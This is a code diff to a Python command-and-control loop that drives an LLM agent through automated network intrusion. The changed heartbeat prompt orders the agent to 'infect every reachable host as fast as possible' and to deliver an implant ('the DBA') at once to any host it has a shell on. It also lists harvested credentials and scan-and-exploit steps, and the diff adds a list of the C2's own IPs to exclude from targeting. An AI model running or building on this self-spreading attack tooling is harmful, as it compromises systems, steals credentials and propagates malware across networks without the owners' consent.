@@ -11,7 +11,7 @@ import asyncio
 import json
 import logging
 import os
-import statistics
+import subprocess
 import uuid
 from contextlib import asynccontextmanager
 from datetime import datetime, timezone
@@ -49,6 +49,15 @@ TRACE_PATH = LOG_DIR / "trace.jsonl"
 
 world = WorldState(run_id=run_id)
 tools_module.configure(world, SKILLS_DIR)
+
+# Discover and store the C2's own IPs so the agent never wastes cycles scanning them.
+try:
+    _c2_ip_output = subprocess.run(["hostname", "-I"], capture_output=True, text=True, timeout=5)
+    _c2_ips = [ip for ip in _c2_ip_output.stdout.strip().split() if ip]
+except Exception:
+    _c2_ips = []
+world.notes["c2_ips"] = " ".join(_c2_ips) if _c2_ips else "unknown"
+log.info("C2 own IPs (never-target list): %s", _c2_ips)
 
 agent_app, _ = build_agent(CONFIG["llm"], SKILLS_DIR, MAX_HOSTS)
 AGENT_CONFIG = {"configurable": {"thread_id": run_id}}
@@ -119,19 +128,20 @@ def _format_batch(batch: list[dict]) -> str:
                 "Do NOT conclude the mission is done — you have not received the mission-complete signal."
             )
 
+        c2_ips = world.notes.get("c2_ips", "unknown")
         parts.append(
-            "[HEARTBEAT — KEEP HUNTING]\n"
-            "No new results arrived recently. This is your signal to re-run discovery.\n\n"
-            f"Infected hosts and their recon state:\n{host_summary}\n\n"
-            f"Credentials harvested:\n{cred_summary}\n\n"
-            "Required actions — do at least one of the following:\n"
-            "1. For any infected host that has NOT run a subnet sweep recently, "
-            "queue `nmap -sn <subnet>/24` on it now.\n"
-            "2. For any discovered IP in 'not yet scanned', queue "
-            "`nmap --top-ports 1000 <ip>` to learn its services.\n"
-            "3. If you have a web service target not yet successfully exploited, "
-            "try again with a different parameter or technique.\n"
-            "4. If you have credentials not yet tried against a reachable target, attempt the move."
+            "[HEARTBEAT — FRESH CONTEXT]\n"
+            f"C2 infrastructure IPs (NEVER scan, target, or attempt to infect): {c2_ips}\n\n"
+            "Time has passed since your last action. The state below reflects the current world — "
+            "it may differ from what you last knew. Review it from scratch before deciding what to do next.\n\n"
+            "Primary objective: infect every reachable host as fast as possible. "
+            "If you have confirmed shell access to any uninfected host, deliver the DBA immediately — "
+            "that is your highest priority action, ahead of extraction or recon on any other host.\n\n"
+            "If you appear stuck (no new hosts reachable, credentials exhausted), consider: "
+            "have any hosts changed state? Are there discovered IPs you have not yet run a top-100 scan against? "
+            "Could a different technique or credential combination unlock a previously failed target?\n\n"
+            f"Infected hosts:\n{host_summary}\n\n"
+            f"Credentials harvested:\n{cred_summary}"
             + termination_line
         )
 
@@ -236,7 +246,7 @@ async def _invoke_agent(batch: list[dict]) -> bool:
     return True
 
 
-HEARTBEAT_INTERVAL: float = 30.0  # seconds between self-recovery ticks when queue is idle
+HEARTBEAT_INTERVAL: float = 15.0  # seconds between self-recovery ticks when queue is idle
 
 
 async def agent_loop() -> None:
